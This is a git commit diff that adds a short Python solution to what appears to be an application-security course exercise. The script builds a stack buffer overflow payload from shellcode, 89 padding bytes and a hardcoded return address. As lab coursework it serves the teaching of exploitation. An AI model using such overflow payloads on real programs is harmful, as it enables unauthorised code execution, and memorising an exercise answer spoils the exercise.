433f51bc27b0e9501fe262f2c393624713288681
aa <aa@aa.com>
2021-02-02 17:38:11 +0800

    Add 1.2.3

--- AppSec/1.2.3.py
+++ AppSec/1.2.3.py
@@ -5,3 +5,10 @@ from shellcode import shellcode
 from struct import pack
 
 # Your code here
+
+pad = 22*4+1
+# 0xfffed69c
+addr = b'\x9c\xd6\xfe\xff'
+sys.stdout.buffer.write(shellcode)
+sys.stdout.buffer.write(b'\xaa'*pad)
+sys.stdout.buffer.write(addr)
